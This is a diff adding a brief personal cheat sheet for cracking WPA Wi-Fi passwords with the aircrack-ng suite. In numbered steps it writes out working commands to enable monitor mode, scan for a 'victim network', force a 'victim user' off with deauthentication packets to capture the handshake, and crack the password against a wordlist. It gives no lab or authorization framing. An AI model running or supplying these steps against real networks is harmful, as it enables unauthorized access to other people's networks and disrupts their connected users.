@@ -1,0 +1,17 @@
+method1 :
+    packagesNeeded : 
+        aircrack-ng # pat install aircrack-ng
+
+process : 
+    1- find your network card name # ip a
+    2- start you network card monitor mode in this way youcan recieve all of the traficc that is near # airmon-ng start network_card_name
+    3- check the mode of network_card_name # iwconfig
+    4- start listening to all network around # airodump-ng network_card_name
+    5- find the bssid and the channel of the victim network
+    6- find the users connected to the network # airodump-ng -d bssid_of_network -w file_name -c channel_of_network your_network_card_name
+    7- send deaunthtication to the victim user # aireplay-ng -0 packet_count -a bssid_of_network -c victim_bssid your_network_card_name
+    8-after recieving hand shake the file will be save at the current directory and now you need word list 
+    9-now find the pass # aircrack-ng -w world_list file_name.cap
+
+    note : to exit monitor mode you should use airmon-ng stop network_card_name then systemctl restart net* 
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
